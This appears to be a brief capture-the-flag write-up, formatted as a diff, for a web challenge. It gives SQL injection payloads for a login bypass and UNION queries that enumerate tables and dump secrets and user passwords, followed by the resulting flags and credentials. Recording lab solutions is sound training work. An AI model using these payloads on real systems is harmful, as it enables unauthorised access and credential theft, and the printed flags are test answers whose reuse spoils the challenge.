@@ -1,0 +1,34 @@
+
+Flag 1 was an sql injection to the admin account, achieved with no password and a username of
+
+admin' OR '1'='1
+
+Welcome Admin!
+
+Here’s the flag: osu{qu0t3_m3_0n_th4t}
+
+Flag 2 and 3 were  found on the user search page. First we login to a user account with any username and the password
+
+' OR '1'='1
+
+The schema was found with
+
+Top Scores for ' UNION SELECT table_name, null FROM information_schema.tables --
+
+And the 2 flags were found using the injected query
+
+' UNION SELECT id, secret FROM secrets UNION SELECT username, null FROM users --
+
+
+
+Top Scores for ' UNION SELECT id, secret FROM secrets UNION SELECT username, password FROM users --
+
+    username: admin, score: urnevergonnaguessthisone
+    username: default-user, score: super_awesome_password
+    username: 1, score: osu{sn34k1n_4r0und}
+    username: supersecretuser, score: osu{4nd5up3rs3cr3tp455w0rd}
+    username: , score: 5
+    username: , score: 1337
+    username: , score: 10
+    username: , score: 1
+    username: , score: 0
